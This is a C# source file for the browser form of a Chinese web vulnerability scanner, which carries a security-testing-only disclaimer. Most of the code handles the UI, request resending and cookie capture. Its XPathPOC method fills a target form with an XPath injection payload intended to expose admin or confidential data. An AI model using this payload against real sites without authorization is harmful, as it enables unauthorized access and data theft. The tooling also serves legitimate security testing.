using Microsoft.JScript;
using SHDocVw;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection.Emit;
using System.Text;
using System.Text.RegularExpressions;
using System.Web;
using System.Windows.Forms;
namespace windowsmanger
{
	public class FormBrowser : Form
	{
		private Timer BrowserTimer;
		private IContainer components;
		private ImageList ImageListBrowser;
		private string LastDomainHost = "";
		private string LastURL = "";
		private FormMain mainfrm;
		private SHDocVw.WebBrowser wb;
		private ToolStrip miniToolStrip;
		private ToolStripSeparator toolStripSeparator4;
		private ToolStripLabel LabelResendURL;
		private ToolStripSeparator toolStripSeparator1;
		private ToolStripTextBox TextBoxResendURL;
		private ToolStripSeparator toolStripSeparator2;
		private ToolStripButton ButtonResend;
		private ToolStripSeparator toolStripSeparator3;
		private ToolStripSeparator toolStripSeparator5;
		private ToolStripLabel LabelResponseCode;
		private ToolStripSeparator toolStripSeparator6;
		private ToolStripButton ButtonLoadInBrowser;
		private ToolStripSeparator toolStripSeparator7;
		private TextBox txtResendResponseCode;
		private TabPage tabBrowser;
		private System.Windows.Forms.WebBrowser WCRBrowser;
		private TabControl tabBrowserForm;
		private TextBox txtResendPostData;
		public FormBrowser(FormMain fm)
		{
			this.InitializeComponent();
			this.mainfrm = fm;
			this.LoadDefaultPage();
			try
			{
				this.wb = (SHDocVw.WebBrowser)this.WCRBrowser.ActiveXInstance;
                this.wb.BeforeNavigate2 += new DWebBrowserEvents2_BeforeNavigate2EventHandler(wb_BeforeNavigate2);
				this.wb.NewWindow3 += new DWebBrowserEvents2_NewWindow3EventHandler(wb_NewWindow3);
			}
			catch
			{
			}
		}
		private void BrowserTimer_Tick(object sender, EventArgs e)
		{
			try
			{
				if (this.WCRBrowser.ReadyState != WebBrowserReadyState.Complete)
				{
					if (this.LastURL != this.WCRBrowser.Url.ToString())
					{
						this.LastURL = this.WCRBrowser.Url.ToString();
						this.WebBrowserLoadCompleted();
					}
					this.WCRBrowser.Stop();
				}
				this.BrowserTimer.Stop();
			}
			catch
			{
			}
		}
		private void ButtonLoadInBrowser_Click(object sender, EventArgs e)
		{
			try
			{
				string text = this.txtResendResponseCode.Text;
				if (!string.IsNullOrEmpty(text))
				{
					Encoding webEncoding = this.mainfrm.CurrentSite.WebEncoding;
					this.WCRBrowser.Navigate("about:blank");
					do
					{
						Application.DoEvents();
					}
					while (this.WCRBrowser.ReadyState != WebBrowserReadyState.Complete);
					this.mainfrm.CurrentSite.WebEncoding = webEncoding;
					this.WCRBrowser.Document.Write(text);
					this.tabBrowserForm.SelectTab(this.tabBrowser);
				}
			}
			catch (Exception exception)
			{
				MessageBox.Show(exception.Message);
			}
		}
		private void ButtonResend_Click(object sender, EventArgs e)
		{
			try
			{
				this.LabelResponseCode.Text = "";
				string text = this.txtResendPostData.Text;
				string str2 = this.TextBoxResendURL.Text;
				if (!string.IsNullOrEmpty(str2))
				{
					str2 = str2 + "^" + text;
					this.mainfrm.DisplayProgress("Resend...");
					HttpWebResponse httpWebResponse = this.mainfrm.CurrentSite.GetHttpWebResponse(str2, RequestType.POST);
					string sourceCodeFromHttpWebResponse = this.mainfrm.CurrentSite.GetSourceCodeFromHttpWebResponse(httpWebResponse);
					this.txtResendResponseCode.Text = sourceCodeFromHttpWebResponse;
					this.LabelResponseCode.Text = httpWebResponse.StatusCode.ToString();
					this.mainfrm.DisplayProgress("Done");
				}
			}
			catch (Exception exception)
			{
				MessageBox.Show(exception.Message);
			}
		}
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}
		public void FillInForm(string Expression)
		{
			this.mainfrm.DisplayProgress("Filling Forms...");
			Expression = Expression.Replace("&amp;", "&");
			Expression = HttpUtility.UrlDecode(Expression, this.mainfrm.CurrentSite.WebEncoding);
			string[] array = Expression.Split(new char[]
			{
				'&'
			});
			for (int j = 0; j < array.Length; j++)
			{
				string str = array[j];
				string[] paraNameValue = WebSite.GetParaNameValue(str, '=');
				try
				{
					this.WCRBrowser.Document.All[paraNameValue[0]].SetAttribute("value", GlobalObject.unescape(paraNameValue[1]));
				}
				catch
				{
				}
				HtmlWindowCollection frames = this.WCRBrowser.Document.Window.Frames;
				for (int i = 0; i < frames.Count; i++)
				{
					try
					{
						this.WCRBrowser.Document.Window.Frames[i].Document.All[paraNameValue[0]].SetAttribute("value", GlobalObject.unescape(paraNameValue[1]));
					}
					catch
					{
					}
				}
			}
			this.mainfrm.DisplayProgress("Done");
		}
		public string GetSourceCodeFromWebBrowser()
		{
			string result;
			try
			{
				string encoding = this.WCRBrowser.Document.Encoding;
				StreamReader reader;
				if (string.IsNullOrEmpty(encoding))
				{
					reader = new StreamReader(this.WCRBrowser.DocumentStream, Encoding.Default);
				}
				else
				{
					reader = new StreamReader(this.WCRBrowser.DocumentStream, Encoding.GetEncoding(encoding));
				}
				string str2 = reader.ReadToEnd();
				reader.Close();
				result = str2;
			}
			catch
			{
				MessageBox.Show("* Null Source Code: Disabled OR No Page Navigated!\r\n* Try To Get Code From URL.");
				result = "";
			}
			return result;
		}
		public int GetWCRBrowserFrameNum()
		{
			return this.WCRBrowser.Document.Window.Frames.Count;
		}
		public string GetWCRBrowserFrameSource(int i)
		{
			string result;
			try
			{
				result = this.WCRBrowser.Document.Window.Frames[i].Document.Body.OuterHtml;
			}
			catch (Exception exception)
			{
				MessageBox.Show(exception.Message);
				result = "";
			}
			return result;
		}
		public string GetWCRBrowserFrameURL(int i)
		{
			string result;
			try
			{
				result = this.WCRBrowser.Document.Window.Frames[i].Url.AbsoluteUri;
			}
			catch (Exception exception)
			{
				MessageBox.Show(exception.Message);
				result = "";
			}
			return result;
		}
		private void HTTPFileReset()
		{
			this.mainfrm.CurrentSite.InjType = InjectionType.UnKnown;
			this.mainfrm.CurrentSite.BlindInjType = BlindType.UnKnown;
			this.mainfrm.UpdateKeyWordText("");
		}
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager resources = new ComponentResourceManager(typeof(FormBrowser));
			this.BrowserTimer = new Timer(this.components);
			this.ImageListBrowser = new ImageList(this.components);
			this.miniToolStrip = new ToolStrip();
			this.toolStripSeparator4 = new ToolStripSeparator();
			this.LabelResendURL = new ToolStripLabel();
			this.toolStripSeparator1 = new ToolStripSeparator();
			this.TextBoxResendURL = new ToolStripTextBox();
			this.toolStripSeparator2 = new ToolStripSeparator();
			this.ButtonResend = new ToolStripButton();
			this.toolStripSeparator3 = new ToolStripSeparator();
			this.toolStripSeparator5 = new ToolStripSeparator();
			this.LabelResponseCode = new ToolStripLabel();
			this.toolStripSeparator6 = new ToolStripSeparator();
			this.ButtonLoadInBrowser = new ToolStripButton();
			this.toolStripSeparator7 = new ToolStripSeparator();
			this.txtResendResponseCode = new TextBox();
			this.txtResendPostData = new TextBox();
			this.tabBrowser = new TabPage();
			this.WCRBrowser = new System.Windows.Forms.WebBrowser();
			this.tabBrowserForm = new TabControl();
			this.tabBrowser.SuspendLayout();
			this.tabBrowserForm.SuspendLayout();
			base.SuspendLayout();
			this.BrowserTimer.Interval = 30000;
			this.BrowserTimer.Tick += new EventHandler(this.BrowserTimer_Tick);
			this.ImageListBrowser.ImageStream = (ImageListStreamer)resources.GetObject("ImageListBrowser.ImageStream");
			this.ImageListBrowser.TransparentColor = Color.Transparent;
			this.ImageListBrowser.Images.SetKeyName(0, "ie.png");
			this.ImageListBrowser.Images.SetKeyName(1, "resend.png");
			this.miniToolStrip.AutoSize = false;
			this.miniToolStrip.BackColor = SystemColors.ButtonFace;
			this.miniToolStrip.CanOverflow = false;
			this.miniToolStrip.Dock = DockStyle.None;
			this.miniToolStrip.GripStyle = ToolStripGripStyle.Hidden;
			this.miniToolStrip.Location = new Point(574, 3);
			this.miniToolStrip.Name = "miniToolStrip";
			this.miniToolStrip.Size = new Size(616, 25);
			this.miniToolStrip.TabIndex = 0;
			this.miniToolStrip.Resize += new EventHandler(this.toolStripResend_Resize);
			this.toolStripSeparator4.Name = "toolStripSeparator4";
			this.toolStripSeparator4.Size = new Size(6, 25);
			this.LabelResendURL.Name = "LabelResendURL";
			this.LabelResendURL.Size = new Size(53, 22);
			this.LabelResendURL.Text = "提交网址";
			this.toolStripSeparator1.Name = "toolStripSeparator1";
			this.toolStripSeparator1.Size = new Size(6, 25);
			this.TextBoxResendURL.AutoSize = false;
			this.TextBoxResendURL.Name = "TextBoxResendURL";
			this.TextBoxResendURL.Overflow = ToolStripItemOverflow.Never;
			this.TextBoxResendURL.Size = new Size(450, 25);
			this.TextBoxResendURL.DoubleClick += new EventHandler(this.TextBoxResendURL_DoubleClick);
			this.toolStripSeparator2.Name = "toolStripSeparator2";
			this.toolStripSeparator2.Size = new Size(6, 25);
			this.ButtonResend.DisplayStyle = ToolStripItemDisplayStyle.Text;
			this.ButtonResend.Image = (Image)resources.GetObject("ButtonResend.Image");
			this.ButtonResend.ImageTransparentColor = Color.Magenta;
			this.ButtonResend.Name = "ButtonResend";
			this.ButtonResend.Size = new Size(45, 22);
			this.ButtonResend.Text = "Resend";
			this.ButtonResend.Click += new EventHandler(this.ButtonResend_Click);
			this.toolStripSeparator3.Name = "toolStripSeparator3";
			this.toolStripSeparator3.Size = new Size(6, 25);
			this.toolStripSeparator5.Name = "toolStripSeparator5";
			this.toolStripSeparator5.Size = new Size(6, 25);
			this.LabelResponseCode.AutoSize = false;
			this.LabelResponseCode.Name = "LabelResponseCode";
			this.LabelResponseCode.Size = new Size(150, 22);
			this.LabelResponseCode.Text = "状态";
			this.LabelResponseCode.TextAlign = ContentAlignment.MiddleLeft;
			this.toolStripSeparator6.Name = "toolStripSeparator6";
			this.toolStripSeparator6.Size = new Size(6, 25);
			this.ButtonLoadInBrowser.DisplayStyle = ToolStripItemDisplayStyle.Text;
			this.ButtonLoadInBrowser.Image = (Image)resources.GetObject("ButtonLoadInBrowser.Image");
			this.ButtonLoadInBrowser.ImageTransparentColor = Color.Magenta;
			this.ButtonLoadInBrowser.Name = "ButtonLoadInBrowser";
			this.ButtonLoadInBrowser.Size = new Size(69, 22);
			this.ButtonLoadInBrowser.Text = "载入浏览器";
			this.ButtonLoadInBrowser.Click += new EventHandler(this.ButtonLoadInBrowser_Click);
			this.toolStripSeparator7.Name = "toolStripSeparator7";
			this.toolStripSeparator7.Size = new Size(6, 25);
			this.txtResendResponseCode.Dock = DockStyle.Fill;
			this.txtResendResponseCode.Location = new Point(0, 0);
			this.txtResendResponseCode.Multiline = true;
			this.txtResendResponseCode.Name = "txtResendResponseCode";
			this.txtResendResponseCode.ScrollBars = ScrollBars.Both;
			this.txtResendResponseCode.Size = new Size(616, 199);
			this.txtResendResponseCode.TabIndex = 0;
			this.txtResendPostData.Dock = DockStyle.Fill;
			this.txtResendPostData.Location = new Point(0, 0);
			this.txtResendPostData.Multiline = true;
			this.txtResendPostData.Name = "txtResendPostData";
			this.txtResendPostData.Size = new Size(616, 94);
			this.txtResendPostData.TabIndex = 0;
			this.tabBrowser.Controls.Add(this.WCRBrowser);
			this.tabBrowser.ImageKey = "ie.png";
			this.tabBrowser.Location = new Point(4, 23);
			this.tabBrowser.Name = "tabBrowser";
			this.tabBrowser.Padding = new Padding(3);
			this.tabBrowser.Size = new Size(622, 353);
			this.tabBrowser.TabIndex = 0;
			this.tabBrowser.Text = "浏览器";
			this.tabBrowser.UseVisualStyleBackColor = true;
			this.WCRBrowser.Dock = DockStyle.Fill;
			this.WCRBrowser.Location = new Point(3, 3);
			this.WCRBrowser.Margin = new Padding(3, 4, 3, 4);
			this.WCRBrowser.MinimumSize = new Size(23, 25);
			this.WCRBrowser.Name = "WCRBrowser";
			this.WCRBrowser.Size = new Size(616, 347);
			this.WCRBrowser.TabIndex = 1;
			this.WCRBrowser.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(this.WCRBrowser_DocumentCompleted);
			this.WCRBrowser.StatusTextChanged += new EventHandler(this.WCRBrowser_StatusTextChanged);
			this.tabBrowserForm.Controls.Add(this.tabBrowser);
			this.tabBrowserForm.Dock = DockStyle.Fill;
			this.tabBrowserForm.ImageList = this.ImageListBrowser;
			this.tabBrowserForm.Location = new Point(0, 0);
			this.tabBrowserForm.Name = "tabBrowserForm";
			this.tabBrowserForm.SelectedIndex = 0;
			this.tabBrowserForm.Size = new Size(630, 380);
			this.tabBrowserForm.TabIndex = 2;
			base.AutoScaleDimensions = new SizeF(6f, 12f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new Size(630, 380);
			base.Controls.Add(this.tabBrowserForm);
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Name = "FormBrowser";
			this.Text = "WebBrowser";
			this.tabBrowser.ResumeLayout(false);
			this.tabBrowserForm.ResumeLayout(false);
			base.ResumeLayout(false);
		}
		private bool IsGovWebSite(string Host)
		{
			bool flag = false;
			if (Regex.IsMatch(Host, "(.gov.\\w+$)|(.gov$)"))
			{
				return true;
			}
			if (Regex.IsMatch(Host, "(.mil.\\w+$)|(.mil$)"))
			{
				flag = true;
			}
			return flag;
		}
		private void LoadDefaultPage()
		{
			this.WCRBrowser.Navigate("about:blank");
			string text = "    <div style=\" width:650px;\">    <h1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 椰树WEB漏洞扫描器</h1>    <p>  &nbsp;&nbsp;&nbsp;&nbsp;  此软件只供安全测试使用，如果软件对其站点进行恶意攻击与本人无关，如软件使用遇到问题或好的建议，请及时与本人联系，谢谢！                  </p>    <p style=\" color:Red\">友情提示：破坏计算机信息系统罪，是指违反国家规定，对计算机信息系统功能或计算机信息系统中存储、处理或者传输的数据和应用程序进行破坏，或者故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的行为。本罪的主体为一般主体，即年满16周岁具有刑事责任能力的自然人均可构成本罪。实际能构成其罪的，通常是那些精通计算机技术、知识的专业人员，如计算机程序设计人员、计算机操作、管理维修人员等。犯本罪的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑</p>    </div>";
			this.WCRBrowser.Document.Write(text);
		}
		public void NavigatePage(string sURL, RequestType ReqType, string SubmitData)
		{
			try
			{
				byte[] postData = null;
				if (ReqType == RequestType.POST)
				{
					postData = Encoding.UTF8.GetBytes(SubmitData);
				}
				else
				{
					if (ReqType == RequestType.COOKIE)
					{
						this.mainfrm.CurrentSite.SetSingleCookie(SubmitData);
					}
				}
				this.mainfrm.DisplayProgress("Navigating ...");
				this.BrowserTimer.Start();
				this.WCRBrowser.Navigate(sURL, null, postData, "Content-Type: application/x-www-form-urlencoded\r\n");
				this.tabBrowserForm.SelectTab(this.tabBrowser);
			}
			catch (Exception exception)
			{
				MessageBox.Show(exception.Message + "\r\nWebBrowser Closed! Please Exit and Run again!");
			}
		}
		public void SelectTabByName(string TabName)
		{
			this.tabBrowserForm.SelectTab(TabName);
		}
		private void TextBoxResendURL_DoubleClick(object sender, EventArgs e)
		{
			this.TextBoxResendURL.SelectAll();
		}
		private void toolStripResend_Resize(object sender, EventArgs e)
		{
		}
		private void wb_BeforeNavigate2(object pDisp, ref object URL, ref object Flags, ref object TargetFrameName, ref object PostData, ref object Headers, ref bool Cancel)
		{
			string submitData = Encoding.ASCII.GetString(PostData as byte[]);
			if (this.mainfrm.ReqType != RequestType.COOKIE)
			{
				this.mainfrm.UpdateSubmitData(submitData);
			}
			this.TextBoxResendURL.Text = (URL as string);
			this.txtResendPostData.Text = submitData;
		}
		private void wb_NewWindow3(ref object ppDisp, ref bool Cancel, uint dwFlags, string bstrUrlContext, string bstrUrl)
		{
			try
			{
				if (bstrUrl.IndexOf("http") >= 0)
				{
					Cancel = true;
					this.WCRBrowser.Navigate(bstrUrl, false);
				}
			}
			catch (Exception exception)
			{
				MessageBox.Show(exception.Message);
			}
		}
		private void WCRBrowser_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
		{
			if (this.WCRBrowser.ReadyState == WebBrowserReadyState.Complete && this.WCRBrowser.Url.ToString() != this.LastURL)
			{
				this.LastURL = this.WCRBrowser.Url.ToString();
				this.WebBrowserLoadCompleted();
			}
		}
		private void WCRBrowser_StatusTextChanged(object sender, EventArgs e)
		{
			this.mainfrm.DisplayProgressNoLog(this.WCRBrowser.StatusText.Replace("&", "&&"));
		}
		private void WebBrowserLoadCompleted()
		{
			try
			{
				string str = this.WCRBrowser.Url.ToString();
				if (str.IndexOf("about:") != 0)
				{
					if (WCRSetting.RefreshURL)
					{
						this.mainfrm.URL = str;
					}
					string encoding = this.WCRBrowser.Document.Encoding;
					if (string.IsNullOrEmpty(encoding))
					{
						this.mainfrm.CurrentSite.WebEncoding = Encoding.Default;
					}
					else
					{
						this.mainfrm.CurrentSite.WebEncoding = Encoding.GetEncoding(encoding);
					}
					this.mainfrm.CurrentSite.DBEncoding = this.mainfrm.CurrentSite.WebEncoding;
				}
				if (!string.IsNullOrEmpty(this.LastDomainHost))
				{
					this.HTTPFileReset();
				}
				if (!this.mainfrm.CurrentSite.DomainHost.Equals(this.LastDomainHost))
				{
					this.mainfrm.CurrentSite.WcrFileName = "";
				}
				this.LastDomainHost = this.mainfrm.CurrentSite.DomainHost;
				this.mainfrm.DisplayProgress("Done");
				string cookie = this.WCRBrowser.Document.Cookie;
				if (!string.IsNullOrEmpty(cookie))
				{
					cookie = cookie.Replace(';', ',');
					this.mainfrm.CurrentSite.cc.SetCookies(this.mainfrm.CurrentSite.URI, cookie);
				}
			}
			catch
			{
			}
		}
		public void XPathPOC(string RefURL, string XPathForm, string Parameter)
		{
			this.mainfrm.NavigatePage(RefURL, RequestType.GET, "");
			string[] paraNameValue = WebSite.GetParaNameValue(Parameter, '=');
			string str = paraNameValue[0];
			string expression = paraNameValue[1];
			string[] strArray2 = new string[2];
			if (XPathForm.IndexOf('^') > 0)
			{
				strArray2 = WebSite.GetParaNameValue(XPathForm, '^');
			}
			else
			{
				if (XPathForm.IndexOf('?') <= 0)
				{
					return;
				}
				strArray2 = WebSite.GetParaNameValue(XPathForm, '?');
			}
			string[] strArray3 = strArray2[1].Split(new char[]
			{
				'&'
			});
			MessageBox.Show("* It Will Open The XPath Page And Fill In Input Fields Automatically! \r\n* When Page Load Completed, Click OK To Continue!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			this.mainfrm.DisplayProgress("Preparing XPath Data...");
			foreach (HtmlElement element in this.WCRBrowser.Document.All)
			{
				for (int i = 0; i < strArray3.Length; i++)
				{
					string[] strArray4 = WebSite.GetParaNameValue(strArray3[i], '=');
					if (element.Name.Equals(strArray4[0]))
					{
						element.SetAttribute("value", GlobalObject.unescape(WebSite.RemoveTestInput(strArray4[1])));
					}
				}
				if (element.Name.Equals(str))
				{
					element.SetAttribute("value", GlobalObject.unescape(WebSite.RemoveTestInput(expression) + "%27] | * | user[@role=%27admin"));
				}
			}
			this.mainfrm.DisplayProgress("Done");
			MessageBox.Show("* XPath Data Filled OK, You Can View Or Change It Now!\r\n* Then Click Button To Submit The Form Manually! \r\n* You Will Get The Response Possibly Include Confidential Data!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
	}
}
